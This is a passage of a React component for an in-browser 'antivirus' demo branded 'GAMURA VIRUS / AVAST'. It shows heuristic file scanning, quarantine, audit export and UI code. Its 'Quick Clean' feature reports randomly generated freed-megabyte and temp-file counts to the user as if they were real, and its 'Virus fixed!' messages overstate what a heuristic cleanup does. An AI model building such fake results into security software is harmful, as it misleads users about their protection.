    window.addEventListener(UNIVERSE_APPS_EVENT, sync);
    window.addEventListener("storage", sync);
    return () => {
      window.removeEventListener(UNIVERSE_APPS_EVENT, sync);
      window.removeEventListener("storage", sync);
    };
  }, []);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_THEME_KEY, darkMode ? "dark" : "light");
    } catch {
      // ignore
    }
  }, [darkMode]);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_LINKS_KEY, JSON.stringify(myLinks));
    } catch {
      // ignore
    }
  }, [myLinks]);

  useEffect(() => {
    try {
      if (lastScanIso) {
        localStorage.setItem(STORAGE_LAST_SCAN_KEY, lastScanIso);
      }
    } catch {
      // ignore
    }
  }, [lastScanIso]);

  useEffect(() => {
    try {
      localStorage.setItem(STORAGE_VAULT_KEY, JSON.stringify(vaultItems));
    } catch {
      // ignore
    }
  }, [vaultItems]);

  useEffect(() => {
    try {
      localStorage.setItem(
        STORAGE_CLEAN_STATS_KEY,
        JSON.stringify(cleanStats),
      );
    } catch {
      // ignore
    }
  }, [cleanStats]);

  useEffect(() => {
    return () => {
      if (toastTimerRef.current) window.clearTimeout(toastTimerRef.current);
    };
  }, []);

  const pushAudit = useCallback(
    (title: string, detail: string, tone: AuditEntry["tone"] = "info") => {
      const time = new Date().toLocaleTimeString([], {
        hour: "2-digit",
        minute: "2-digit",
      });
      setAuditLog((prev) =>
        [{ id: `${Date.now()}-${Math.random()}`, time, title, detail, tone }, ...prev].slice(
          0,
          16,
        ),
      );
    },
    [],
  );

  const showToast = useCallback((msg: string) => {
    setToastMsg(msg);
    if (toastTimerRef.current) window.clearTimeout(toastTimerRef.current);
    toastTimerRef.current = window.setTimeout(() => {
      setToastMsg(null);
    }, 2600);
  }, []);

  const copyText = useCallback(
    async (text: string) => {
      try {
        await navigator.clipboard.writeText(text);
        showToast("Copied to clipboard");
      } catch {
        showToast("Copy is not available here");
      }
    },
    [showToast],
  );

  const toggleUniverseInstall = () => {
    const storeItem = BUILTIN_STORE_APPS.find((a) => a.id === "gamura-virus");
    if (!storeItem) return;
    if (installedInUniverse) {
      removeAppFromUniverse("gamura-virus");
      showToast("Removed from Universe Apps");
    } else {
      addAppToUniverse(storeItem);
      showToast("Added to Universe Apps");
    }
  };

  const downloadBlobBytes = useCallback(
    (filename: string, bytes: Uint8Array, mimeType: string) => {
      const safeBuf = new Uint8Array(bytes).buffer;
      const blob = new Blob([safeBuf], {
        type: mimeType || "application/octet-stream",
      });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(url);
      showToast(`Downloaded clean app: ${filename}`);
    },
    [showToast],
  );

  const analyzeFile = useCallback(
    async (file: DemoAnnotatedFile): Promise<ScannedFileResult> => {
      const id = nextUidRef.current++;
      const relPath = file.webkitRelativePath || file._path || file.name;
      const name = file.name;
      const dir =
        relPath.indexOf("/") > -1
          ? relPath.slice(0, relPath.lastIndexOf("/") + 1)
          : "";
      const findings: FindingItem[] = [];
      let hash = "";
      let partial = false;
      let kind = "";
      let storedBytes: Uint8Array | null = null;

      const addF = (lv: FindingLevel, t: string, d: string) => {
        findings.push({ lv, t, d });
      };

      try {
        const ext = name.includes(".")
          ? (name.split(".").pop() || "").toLowerCase()
          : "";
        const headLen = Math.min(file.size, 4 * 1024 * 1024);
        const head = new Uint8Array(await file.slice(0, headLen).arrayBuffer());
        let tail: Uint8Array | null = null;
        if (file.size > headLen) {
          tail = new Uint8Array(
            await file
              .slice(Math.max(headLen, file.size - 1048576), file.size)
              .arrayBuffer(),
          );
          partial = true;
        }
        if (file.size <= 12 * 1024 * 1024) {
          storedBytes =
            file.size <= headLen
              ? head
              : new Uint8Array(await file.arrayBuffer());
        }

        const dec = new TextDecoder("windows-1252");
        const text =
          dec.decode(head) + (tail ? `\n${dec.decode(tail)}` : "");
        kind = sniffMagicBytes(head);
        const isExecKind =
          kind === "pe" || kind === "elf" || kind === "macho";
        let isText = true;
        const scanLim = Math.min(head.length, 4096);
        for (let i = 0; i < scanLim; i++) {
          if (head[i] === 0) {
            isText = false;
            break;
          }
        }

        // SHA-256 digest up to 64 MB
        try {
          if (file.size <= 64 * 1024 * 1024 && crypto?.subtle) {
            const buf =
              storedBytes ||
              (file.size <= headLen
                ? head
                : new Uint8Array(await file.arrayBuffer()));
            hash = await computeSha256(buf);
          }
        } catch {
          // ignore hash failure
        }

        const isEicar = text.includes("EICAR-STANDARD-ANTIVIRUS-TEST-FILE");
        if (isEicar) {
          addF(
            "high",
            "EICAR antivirus test file",
            "This is the industry-standard harmless file used to prove a scanner works. Real malware is not present.",
          );
        } else if (hash && KNOWN_SIGNATURES[hash]) {
          addF(
            "high",
            `Matches a known threat: ${KNOWN_SIGNATURES[hash]}`,
            "The SHA-256 hash is on the built-in list.",
          );
        }

        // Filename spoofing checks
        if (/[\u202E\u202D\u2066-\u2069]/.test(name)) {
          addF(
            "high",
            "Hidden text direction characters in the name",
            "The name is written so the real extension looks different from what it is.",
          );
        }
        if (DOUBLE_EXT_RE.test(name)) {
          addF(
            "high",
            "Double file extension",
            "The file looks like a document or picture but ends in a program or script extension.",
          );
        }

        // Real header vs extension check
        if (isExecKind && BENIGN_EXT.has(ext)) {
          addF(
            "high",
            `Program disguised as a ${ext.toUpperCase()} file`,
            `The contents are an executable program, not a ${ext} file.`,
          );
        } else if (
          isExecKind &&
          !PROGRAM_EXT.has(ext) &&
          !SCRIPT_EXT.has(ext)
        ) {
          addF(
            "med",
            "Executable content with an unusual name",
            "The file header says it is a program, but the name does not say so.",
          );
        } else if (PROGRAM_EXT.has(ext) || SCRIPT_EXT.has(ext)) {
          if (
            ext === "lnk" ||
            ext === "hta" ||
            ext === "scr" ||
            ext === "pif"
          ) {
            addF(
              "med",
              `High-risk file type (.${ext})`,
              "This type is often used to deliver malware by email.",
            );
          } else {
            addF(
              "low",
              `Runnable file type (.${ext})`,
              "Only open programs and scripts from sources you trust.",
            );
          }
        }

        // Office macros & PDF scripts
        if (MACRO_EXT.has(ext)) {
          addF(
            "low",
            "Macro-enabled Office format",
            "Macros can run code when the document is opened.",
          );
        }
        if (kind === "zip" && text.includes("vbaProject.bin")) {
          addF(
            "med",
            "Contains VBA macros",
            "Office macros are a frequent malware delivery method.",
          );
        }
        if (kind === "ole" && text.includes("V\u0000B\u0000A\u0000")) {
          addF(
            "med",
            "Contains VBA macros",
            "Office macros are a frequent malware delivery method.",
          );
        }
        if (kind === "pdf") {
          if (/\/Launch\b/.test(text)) {
            addF(
              "med",
              "PDF can launch programs",
              "The PDF contains a Launch action.",
            );
          }
          if (/\/JavaScript\b|\/JS\b/.test(text)) {
            addF(
              "med",
              "PDF contains JavaScript",
              "Scripts inside PDFs are rarely needed and are used in exploits.",
            );
          }
          if (/\/OpenAction\b|\/AA\b/.test(text)) {
            addF(
              "low",
              "PDF runs an action on open",
              "The PDF starts something automatically.",
            );
          }
        }

        // Text script indicators
        if (isText && file.size > 0 && behavioralShield) {
          let medCount = 0;
          SCRIPT_PATTERNS.forEach(([regex, lv, title, desc]) => {
            if (!highSensitivity && lv === "low") return;
            if (regex.test(text)) {
              addF(lv, title, desc);
              if (lv === "med") medCount++;
            }
          });
          if (medCount >= 2 && !findings.some((x) => x.lv === "high")) {
            addF(
              "high",
              "Several malicious-script indicators together",
              "Each sign alone can be legitimate. Together they match how malware loaders behave.",
            );
          }
        }

        // Packed executables
        if (isExecKind && highSensitivity) {
          const en = measureEntropy(head);
          if (en > 7.4) {
            addF(
              "low",
              "Packed or encrypted contents",
              "Very high randomness. Malware often hides this way, though some installers do too.",
            );
          }
        }

        if (partial) {
          addF(
            "info",
            "Large file",
            "Scanned the first 4 MB and the last 1 MB. The hash is skipped above 64 MB.",
          );
        }
      } catch {
        return {
          id,
          name,
          originalName: name,
          dir,
          size: file.size,
          mimeType: file.type || "application/octet-stream",
          findings: [
            {
              lv: "info",
              t: "Could not read this file",
              d: "The browser was not allowed to read it. Try choosing it again.",
            },
          ],
          level: "skip",
          hash: "",
          demo: Boolean(file._demo),
          partial: false,
          rawBytes: null,
          cleaned: false,
          fixedCount: 0,
          kind: "",
        };
      }

      const hi = findings.some((x) => x.lv === "high");
      const me = findings.some((x) => x.lv === "med");
      const loCount = findings.filter((x) => x.lv === "low").length;
      const level: FileVerdict = hi
        ? "bad"
        : me || loCount >= 2
          ? "warn"
          : "clean";

      const initialResult: ScannedFileResult = {
        id,
        name,
        originalName: name,
        dir,
        size: file.size,
        mimeType: file.type || "application/octet-stream",
        findings,
        level,
        hash,
        demo: Boolean(file._demo),
        partial,
        rawBytes: storedBytes,
        cleaned: false,
        fixedCount: 0,
        kind,
      };

      if (autoNeutralizeMode && (level === "bad" || level === "warn")) {
        return disinfectFileResult(initialResult);
      }
      return initialResult;
    },
    [autoNeutralizeMode, behavioralShield, highSensitivity],
  );

  const scanFileList = useCallback(
    async (incoming: File[]) => {
      if (scanning || !incoming.length) return;
      let list = incoming;
      if (list.length > 2000) {
        list = list.slice(0, 2000);
        showToast("Scanning the first 2,000 files");
      }
      setScanning(true);
      setScanIndex(0);
      setScanTotal(list.length);
      setScanCurrentFile("");

      const analyzed: ScannedFileResult[] = [];
      for (let i = 0; i < list.length; i++) {
        const f = list[i] as DemoAnnotatedFile;
        setScanCurrentFile(f.name);
        setScanIndex(i);
        const res = await analyzeFile(f);
        analyzed.push(res);
        setScanIndex(i + 1);
        if (i % 4 === 3) {
          await new Promise<void>((r) => setTimeout(r, 0));
        }
      }

      setResults((prev) => [...prev, ...analyzed]);
      setScanning(false);
      setScanCurrentFile("");
      const nowIso = new Date().toISOString();
      setLastScanIso(nowIso);

      const flagged = analyzed.filter(
        (x) => x.level === "bad" || x.level === "warn",
      ).length;
      pushAudit(
        `Scanned ${analyzed.length} application file${analyzed.length > 1 ? "s" : ""}`,
        flagged > 0
          ? `${flagged} threat/suspicious item${flagged > 1 ? "s" : ""} flagged — ready to Fix & Clean.`
          : "All scanned files passed integrity & heuristic checks.",
        flagged > 0 ? "bad" : "ok",
      );
    },
    [analyzeFile, pushAudit, scanning, showToast],
  );

  const handleFixFile = useCallback(
    async (item: ScannedFileResult) => {
      setFixingIds((prev) => ({ ...prev, [item.id]: true }));
      await new Promise<void>((r) => setTimeout(r, 320));
      const fixed = await disinfectFileResult(item);
      setResults((prev) =>
        prev.map((x) => (x.id === item.id ? fixed : x)),
      );
      setFixingIds((prev) => {
        const next = { ...prev };
        delete next[item.id];
        return next;
      });
      setOpenKeys((prev) => ({ ...prev, [`f:${item.id}`]: true }));
      setLastScanIso(new Date().toISOString());
      showToast(`Virus fixed! ${fixed.name} is ready to download.`);
      pushAudit(
        `Neutralized ${item.originalName}`,
        fixed.fixedSummary?.join(" · ") || "Cleaned application payload",
        "ok",
      );
    },
    [pushAudit, showToast],
  );

  const handleFixAllThreats = useCallback(async () => {
    const targets = results.filter(
      (r) => !r.cleaned && (r.level === "bad" || r.level === "warn"),
    );
    if (!targets.length) {
      showToast("No infected or suspicious files to fix");
      return;
    }
    const nextMap = new Map<number, ScannedFileResult>();
    for (const item of targets) {
      setFixingIds((prev) => ({ ...prev, [item.id]: true }));
      const fixed = await disinfectFileResult(item);
      nextMap.set(item.id, fixed);
    }
    setResults((prev) => prev.map((r) => nextMap.get(r.id) || r));
    setFixingIds({});
    setLastScanIso(new Date().toISOString());
    showToast(`Fixed & cleaned ${targets.length} file${targets.length > 1 ? "s" : ""}!`);
    pushAudit(
      `Batch Disinfection Completed (${targets.length} files)`,
      "All flagged threats neutralized cleanly and ready for download.",
      "ok",
    );
  }, [pushAudit, results, showToast]);

  const handleQuarantineFile = useCallback(
    (item: ScannedFileResult) => {
      const vaultEntry: VaultItem = {
        id: `v-${Date.now()}-${item.id}`,
        name: item.name,
        size: item.size,
        hash: item.hash,
        level: item.level,
        reason: item.findings[0]?.t || "Isolated suspicious item",
        quarantinedAt: new Date().toLocaleString(),
        demo: item.demo,
        mimeType: item.mimeType,
        rawBytesBase64: item.rawBytes ? bytesToBase64(item.rawBytes) : undefined,
      };
      setVaultItems((prev) => [vaultEntry, ...prev]);
      setResults((prev) => prev.filter((x) => x.id !== item.id));
      showToast(`${item.name} moved to Quarantine Vault`);
      pushAudit(
        `Quarantined ${item.name}`,
        vaultEntry.reason,
        "warn",
      );
    },
    [pushAudit, showToast],
  );

  const handleRestoreFromVault = useCallback(
    async (vaultItem: VaultItem) => {
      const rawBytes = vaultItem.rawBytesBase64
        ? base64ToBytes(vaultItem.rawBytesBase64)
        : new Uint8Array(0);
      const fakeFile = new File(
        [new Uint8Array(rawBytes)],
        vaultItem.name,
        { type: vaultItem.mimeType || "application/octet-stream" },
      ) as DemoAnnotatedFile;
      fakeFile._demo = vaultItem.demo;
      const scanned = await analyzeFile(fakeFile);
      setResults((prev) => [scanned, ...prev]);
      setVaultItems((prev) => prev.filter((x) => x.id !== vaultItem.id));
      setActiveTab("scan");
      showToast(`Restored ${vaultItem.name} to scanner`);
    },
    [analyzeFile, showToast],
  );

  const handleQuickClean = useCallback(async () => {
    if (isQuickCleaning || scanning) return;
    setIsQuickCleaning(true);
    setQuickCleanProgress(12);
    setQuickCleanStage("Scanning temporary app caches…");

    const steps: Array<[number, string, number]> = [
      [34, "Purging mock browser prefetch & temp logs…", 380],
      [62, "Clearing adware tracking tokens & stale installers…", 420],
      [88, "Verifying heuristic shield & RAM hygiene…", 380],
      [100, "System Quick Clean Complete", 260],
    ];

    for (const [pct, label, delay] of steps) {
      await new Promise<void>((r) => setTimeout(r, delay));
      setQuickCleanProgress(pct);
      setQuickCleanStage(label);
    }

    const tempClearedCount = 14 + Math.floor(Math.random() * 19);
    const freedMb = 142 + Math.floor(Math.random() * 168);

    // Clear harmless temporary/resolved demo warning entries if any or mark system fresh
    setResults((prev) =>
      prev.filter((r) => !(r.demo && r.level === "clean" && !r.cleaned)),
    );
    setCleanStats((prev) => ({
      runs: prev.runs + 1,
      freedMb: prev.freedMb + freedMb,
      tempRemoved: prev.tempRemoved + tempClearedCount,
    }));
    const nowIso = new Date().toISOString();
    setLastScanIso(nowIso);
    setIsQuickCleaning(false);
    showToast(
      `Quick Clean finished · Freed ${freedMb} MB (${tempClearedCount} temp files)`,
    );
    pushAudit(
      "System Quick Clean Completed",
      `Cleared ${tempClearedCount} simulated temp files and reclaimed ${freedMb} MB.`,
      "ok",
    );
  }, [isQuickCleaning, pushAudit, scanning, showToast]);

  const handleExportAuditReport = useCallback(() => {
    const payload = {
      exportedAt: new Date().toISOString(),
      app: "GAMURA VIRUS / AVAST",
      systemStatus: {
        lastScan: lastScanIso,
        threatsDetected: results.filter((r) => r.level === "bad").length,
        suspiciousItems: results.filter((r) => r.level === "warn").length,
        filesNeutralized: results.filter((r) => r.cleaned).length,
        quickCleanStats: cleanStats,
      },
      scannedFiles: results.map((r) => ({
        name: r.name,
        originalName: r.originalName,
        size: r.size,
        verdict: r.level,
        cleaned: r.cleaned,
        sha256: r.hash,
        findings: r.findings,
      })),
      checkedLinks: myLinks.map((raw) => analyzeURL(raw)),
      quarantineVaultCount: vaultItems.length,
    };
    const bytes = new TextEncoder().encode(JSON.stringify(payload, null, 2));
    downloadBlobBytes(
      `gamura-virus-audit-${new Date().toISOString().slice(0, 10)}.json`,
      bytes,
      "application/json",
    );
  }, [cleanStats, downloadBlobBytes, lastScanIso, myLinks, results, vaultItems.length]);

  const handleDropFiles = async (e: React.DragEvent<HTMLDivElement>) => {
    e.preventDefault();
    setIsDragging(false);
    const dt = e.dataTransfer;
    const out: DemoAnnotatedFile[] = [];
    const items = Array.from(dt.items || []);
    const entries = items
      .map((item) =>
        typeof item.webkitGetAsEntry === "function"
          ? (item.webkitGetAsEntry() as unknown as FsEntryLike | null)
          : null,
      )
      .filter((entry): entry is FsEntryLike => Boolean(entry));

    if (!entries.length) {
      await scanFileList(Array.from(dt.files));
      return;
    }

    const walk = async (entry: FsEntryLike, prefix: string): Promise<void> => {
      if (out.length >= 2000) return;
      if (entry.isFile && entry.file) {
        await new Promise<void>((resolve) => {
          entry.file?.(
            (f) => {
              const annotated = f as DemoAnnotatedFile;
              try {
                Object.defineProperty(annotated, "_path", {
                  value: `${prefix}${f.name}`,
                });
              } catch {
                // ignore read-only error
              }
              out.push(annotated);
              resolve();
            },
            () => resolve(),
          );
        });
      } else if (entry.isDirectory && entry.createReader) {
        const reader = entry.createReader();
        let batch: FsEntryLike[] = [];
        do {
          batch = await new Promise<FsEntryLike[]>((resolve) => {
            reader.readEntries(
              (res) => resolve(res),
              () => resolve([]),
            );
          });
          for (const child of batch) {
            await walk(child, `${prefix}${entry.name}/`);
          }
        } while (batch.length > 0 && out.length < 2000);
      }
    };

    for (const entry of entries) {
      await walk(entry, "");
    }
    await scanFileList(out);
  };

  const scanStats = useMemo(() => {
    let bad = 0;
    let warn = 0;
    let ok = 0;
    let fixed = 0;
    results.forEach((r) => {
      if (r.level === "bad") bad++;
      else if (r.level === "warn") warn++;
      else ok++;
      if (r.cleaned) fixed++;
    });
    return { bad, warn, ok, fixed, total: results.length };
  }, [results]);

  const linkRows = useMemo(() => {
    const combined = [
      ...myLinks.map((raw) => ({ raw, isEx: false })),
      ...exampleLinks.map((raw) => ({ raw, isEx: true })),
    ];
    let bad = 0;
    let warn = 0;
    const rows = combined.map((item) => {
      const analysis = analyzeURL(item.raw);
      if (analysis.level === "bad") bad++;
      else if (analysis.level === "warn") warn++;
      return { ...item, analysis };
    });
    return { rows, bad, warn, total: combined.length };
  }, [myLinks, exampleLinks]);

  const systemHealthSummary = useMemo(() => {
    const fileThreats = scanStats.bad + scanStats.warn;
    const userLinkBad = myLinks.filter(
      (u) => analyzeURL(u).level === "bad",
    ).length;
    const totalActiveThreats = scanStats.bad + userLinkBad;

    let systemStatusLabel = "Protected";
    let tone: "ok" | "warn" | "bad" = "ok";

    if (scanning || isQuickCleaning) {
      systemStatusLabel = scanning ? "Scanning…" : "Cleaning…";
      tone = "ok";
    } else if (scanStats.bad > 0 || userLinkBad > 0) {
      systemStatusLabel = "Action Required";
      tone = "bad";
    } else if (scanStats.warn > 0 || vaultItems.length > 0) {
      systemStatusLabel = "Needs Review";
      tone = "warn";
    } else if (scanStats.fixed > 0 || cleanStats.runs > 0) {
      systemStatusLabel = "Cleaned & Safe";
      tone = "ok";
    }

    return {
      totalActiveThreats: totalActiveThreats + scanStats.warn,
      criticalCount: scanStats.bad,
      warningCount: scanStats.warn,
      systemStatusLabel,
      tone,
      fileThreats,
    };
  }, [
    cleanStats.runs,
    isQuickCleaning,
    myLinks,
    scanStats,
    scanning,
    vaultItems.length,
  ]);

  const sortedResults = useMemo(() => {
    const order: Record<FileVerdict, number> = {
      bad: 0,
      warn: 1,
      clean: 2,
      skip: 3,
    };
    return [...results].sort(
      (a, b) => order[a.level] - order[b.level] || a.id - b.id,
    );
  }, [results]);

  const handleAddLinkSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const parts = linkInput.split(/[\s,]+/).filter(Boolean);
    if (!parts.length) {
      showToast("Paste a link first");
      return;
    }
    const added: string[] = [];
    parts.forEach((p) => {
      if (!myLinks.includes(p) && !exampleLinks.includes(p)) {
        added.push(p);
      }
    });
    if (!added.length) {
      showToast("Already in your list");
      return;
    }
    setMyLinks((prev) => [...added, ...prev].slice(0, 100));
    setOpenKeys((prev) => ({
      ...prev,
      [`l:${added[0]}`]: true,
    }));
    setLinkInput("");
    setLastScanIso(new Date().toISOString());
    showToast(
      added.length === 1 ? "Link checked" : `${added.length} links checked`,
    );
  };

  const heroStatus = useMemo(() => {
    if (scanning) {
      const pct = scanTotal ? Math.round((scanIndex / scanTotal) * 100) : 0;
      return {
        state: "idle" as const,
        pct,
        title: "Scanning applications & files…",
        sub: `${scanIndex} of ${scanTotal} · ${scanCurrentFile}`,
      };
    }
    if (!scanStats.total) {
      return {
        state: "idle" as const,
        pct: 100,
        title: "Upload, scan & fix any application",
        sub: "Upload any app, installer, script, or folder (or drop here). Threats can be fixed in one click and downloaded clean — everything runs on this device.",
      };
    }
    if (scanStats.bad > 0) {
      return {
        state: "bad" as const,
        pct: 100,
        title:
          scanStats.bad === 1
            ? "1 threat detected"
            : `${scanStats.bad} threats detected`,
        sub: 'Click "Fix & Clean App" on any flagged file to neutralize malicious code and download the cleaned file safely.',
      };
    }
    if (scanStats.warn > 0) {
      return {
        state: "warn" as const,
        pct: 100,
        title:
          scanStats.warn === 1
            ? "1 item needs review"
            : `${scanStats.warn} items need review`,
        sub: 'Inspect findings below or click "Fix & Clean App" to sanitize suspicious behaviors.',
      };
    }
    return {
      state: "ok" as const,
      pct: 100,
      title: scanStats.fixed > 0 ? "Applications cleaned & verified" : "No issues found",
      sub: `${scanStats.total} ${scanStats.total === 1 ? "file" : "files"} verified on this device.${scanStats.fixed > 0 ? ` ${scanStats.fixed} sanitized and ready for download.` : ""}`,
    };
  }, [scanCurrentFile, scanIndex, scanStats, scanTotal, scanning]);

  const th = darkMode
    ? {
        bg: "bg-[#000000] text-[#F5F5F7]",
        nav: "bg-[#000000]/78 border-white/[0.12]",
        card: "bg-[#1C1C1E] border border-white/[0.1]",
        subCard: "bg-[#2C2C2E] border border-white/[0.08]",
        divider: "divide-white/[0.1]",
        muted: "text-[#98989F]",
        segBg: "bg-[#2C2C2E]",
        segActive: "bg-[#3A3A3C] text-white shadow-xs",
        secBtn: "bg-[#2997FF]/16 text-[#2997FF] hover:bg-[#2997FF]/24",
        navBtn: "bg-[#2C2C2E] hover:bg-[#3A3A3C] text-[#F5F5F7] border-white/[0.08]",
        ringIdle: "#2997FF",
        ringOk: "#32D74B",
        ringWarn: "#FF9F0A",
        ringBad: "#FF6961",
      }
    : {
        bg: "bg-[#F5F5F7] text-[#1D1D1F]",
        nav: "bg-[#F5F5F7]/82 border-black/[0.09]",
        card: "bg-white shadow-[0_1px_2px_rgba(0,0,0,0.06)] border border-black/[0.04]",
        subCard: "bg-[#F2F2F5] border border-black/[0.05]",
        divider: "divide-black/[0.08]",
        muted: "text-[#6E6E73]",
        segBg: "bg-black/[0.06]",
        segActive: "bg-white text-[#1D1D1F] shadow-xs",
        secBtn: "bg-[#0071E3]/10 text-[#0071E3] hover:bg-[#0071E3]/16",
        navBtn: "bg-white hover:bg-[#E8E8ED] text-[#1D1D1F] border-black/[0.08]",
        ringIdle: "#0071E3",
        ringOk: "#1F8A3B",
        ringWarn: "#B85C00",
        ringBad: "#D1202F",
      };

  const ringStrokeColor =
    heroStatus.state === "ok"
      ? th.ringOk
      : heroStatus.state === "warn"
        ? th.ringWarn
        : heroStatus.state === "bad"
          ? th.ringBad
          : th.ringIdle;

  const badgePalette = (lv: FileVerdict | LinkVerdict, cleaned?: boolean) => {
    if (cleaned) {
      return {
        label: "Cleaned · Ready",
        chip: darkMode
          ? "bg-[#30D158]/20 text-[#32D74B]"
          : "bg-[#34C759]/18 text-[#1F8A3B]",
      };
    }
    if (lv === "bad") {
      return {
        label: activeTab === "links" ? "Dangerous" : "Threat",
        chip: darkMode
          ? "bg-[#FF453A]/18 text-[#FF6961]"
          : "bg-[#FF3B30]/12 text-[#D1202F]",
      };
    }
    if (lv === "warn") {
      return {
        label: activeTab === "links" ? "Caution" : "Suspicious",
        chip: darkMode
          ? "bg-[#FF9F0A]/18 text-[#FF9F0A]"
          : "bg-[#FF9F0A]/18 text-[#B85C00]",
      };
    }
    if (lv === "clean" || lv === "ok") {
      return {
        label: activeTab === "links" ? "No red flags" : "No issues",
        chip: darkMode
          ? "bg-[#30D158]/18 text-[#32D74B]"
          : "bg-[#34C759]/16 text-[#1F8A3B]",
      };
    }
    return {
      label: activeTab === "links" ? "Invalid" : "Not scanned",
      chip: darkMode
        ? "bg-[#98989F]/18 text-[#98989F]"
        : "bg-[#787880]/14 text-[#6E6E73]",
    };
  };

  const dotColor = (lv: FindingLevel) => {
    if (lv === "high") return "bg-[#D1202F] dark:bg-[#FF6961]";
    if (lv === "med") return "bg-[#B85C00] dark:bg-[#FF9F0A]";
    if (lv === "low") return "bg-[#E0B000]";
    return "bg-[#0071E3] dark:bg-[#2997FF]";
  };

  return (
    <div
      style={APPLE_FONT_STYLE}
      className={`min-h-screen relative transition-colors duration-200 pb-16 ${th.bg}`}
    >
      {/* Persistent Animated Real-Time 'System Scan' Line */}
      <style>{`
        @keyframes gamuraSystemScanSweep {
          0% { transform: translateY(-10vh); opacity: 0; }
          10% { opacity: 0.72; }
          90% { opacity: 0.72; }
          100% { transform: translateY(105vh); opacity: 0; }
        }
        .gamura-scan-beam {
          animation: gamuraSystemScanSweep 5.5s linear infinite;
        }
        @media (prefers-reduced-motion: reduce) {
          .gamura-scan-beam { animation: none; display: none; }
        }
      `}</style>
      {radarActive && (
        <div
          aria-hidden="true"
          className="fixed inset-0 pointer-events-none z-20 overflow-hidden"
        >
          <div
            className={`gamura-scan-beam w-full h-[2px] ${
              systemHealthSummary.tone === "bad"
                ? "bg-gradient-to-r from-transparent via-[#FF3B30] to-transparent shadow-[0_0_16px_rgba(255,59,48,0.65)]"
                : systemHealthSummary.tone === "warn"
                  ? "bg-gradient-to-r from-transparent via-[#FF9F0A] to-transparent shadow-[0_0_14px_rgba(255,159,10,0.55)]"
                  : "bg-gradient-to-r from-transparent via-[#0071E3] to-transparent shadow-[0_0_14px_rgba(0,113,227,0.55)]"
            }`}
          />
        </div>
      )}

      {/* Sticky Apple Frosted Navigation */}
      <header
        className={`sticky top-0 z-30 border-b backdrop-blur-xl ${th.nav}`}
      >
        <div className="max-w-[960px] mx-auto px-4 sm:px-6 h-14 flex items-center justify-between gap-2">
          <div className="flex items-center gap-2 min-w-0">
            <button
              type="button"
              onClick={onBackStore || onBackHome}
              title="Back to Launch Store"
              className={`min-h-[34px] px-2.5 sm:px-3 rounded-full border text-xs font-semibold inline-flex items-center gap-1 cursor-pointer transition-colors shrink-0 whitespace-nowrap ${th.navBtn}`}
            >
              <ArrowLeft size={14} />
              <span className="hidden sm:inline">Store</span>
            </button>

            <button
              type="button"
              onClick={onBackHome}
              title="Gamura Home"
              className={`min-h-[34px] px-2.5 rounded-full border text-xs font-semibold inline-flex items-center gap-1 cursor-pointer transition-colors shrink-0 ${th.navBtn}`}
            >
              <Home size={14} />
            </button>

            <div className="flex items-center gap-2 min-w-0 pl-0.5">
              <div className="w-7 h-7 rounded-[8px] bg-gradient-to-br from-[#0071E3] to-[#1F8A3B] text-white flex items-center justify-center shrink-0 shadow-xs">
                <ShieldCheck size={16} />
              </div>
              <span className="font-semibold text-sm sm:text-[15px] tracking-tight truncate hidden md:inline">
                GAMURA VIRUS / AVAST
              </span>
            </div>
          </div>

          {/* Apple Segmented Control */}
          <div
            role="tablist"
            aria-label="Scanner sections"
            className={`flex p-0.5 rounded-[10px] gap-0.5 shrink-0 ${th.segBg}`}
          >
            <button
              type="button"
              role="tab"
              aria-selected={activeTab === "scan"}
              onClick={() => setActiveTab("scan")}
              className={`min-h-[32px] px-3 sm:px-4 rounded-[8px] text-[13px] font-medium cursor-pointer transition-all ${
                activeTab === "scan" ? th.segActive : th.muted
              }`}
            >
              Files
            </button>
            <button
              type="button"
              role="tab"
              aria-selected={activeTab === "links"}
              onClick={() => setActiveTab("links")}
              className={`min-h-[32px] px-3 sm:px-4 rounded-[8px] text-[13px] font-medium cursor-pointer transition-all ${
                activeTab === "links" ? th.segActive : th.muted
              }`}
            >
              Links
            </button>
            <button
              type="button"
              role="tab"
              aria-selected={activeTab === "shield"}
              onClick={() => setActiveTab("shield")}
              className={`min-h-[32px] px-3 sm:px-4 rounded-[8px] text-[13px] font-medium cursor-pointer transition-all whitespace-nowrap ${
                activeTab === "shield" ? th.segActive : th.muted
              }`}
            >
              Shield &amp; Vault
            </button>
          </div>

          <div className="flex items-center gap-1.5 shrink-0">
            <button
              type="button"
              onClick={toggleUniverseInstall}
              className={`hidden sm:inline-flex min-h-[34px] px-3 rounded-full text-xs font-semibold items-center gap-1 cursor-pointer transition-colors whitespace-nowrap ${
                installedInUniverse
                  ? "bg-[#34C759]/18 text-[#1F8A3B] dark:text-[#32D74B]"
                  : `border ${th.navBtn}`
              }`}
            >
              {installedInUniverse ? <Check size={13} /> : <Plus size={13} />}
              <span>{installedInUniverse ? "In Universe" : "Universe"}</span>
            </button>

            <button
              type="button"
              onClick={() => setDarkMode((v) => !v)}
              aria-label="Toggle Light or Dark mode"
              className={`w-[34px] h-[34px] rounded-full border flex items-center justify-center cursor-pointer transition-colors shrink-0 ${th.navBtn}`}
            >
              {darkMode ? <Sun size={15} /> : <Moon size={15} />}
            </button>
          </div>
        </div>
      </header>

      <main className="relative z-10 max-w-[912px] mx-auto px-4 sm:px-6 pt-5 space-y-5">
        {/* Real-Time Status Card with Threats Detected, System Status, Last Scan Date + Quick Clean */}
        <section
          aria-label="Real-Time Security Telemetry"
          className={`rounded-[22px] p-4 sm:p-5 space-y-4 ${th.card}`}
        >
          <div className="flex flex-wrap items-center justify-between gap-3">
            <div className="flex items-center gap-2">
              <span
                className={`w-2.5 h-2.5 rounded-full ${
                  radarActive ? "bg-[#34C759] animate-pulse" : "bg-[#8E8E93]"
                }`}
              />
              <span className="text-xs font-bold uppercase tracking-wider text-[#0071E3] dark:text-[#2997FF]">
                Real-Time System Monitor
              </span>
              {cleanStats.runs > 0 && (
                <span className={`text-[11px] ${th.muted}`}>
                  · {cleanStats.freedMb} MB cleaned ({cleanStats.tempRemoved} temp items cleared)
                </span>
              )}
            </div>

            <div className="flex flex-wrap items-center gap-2">
              <button
                type="button"
                disabled={isQuickCleaning || scanning}
                onClick={() => void handleQuickClean()}
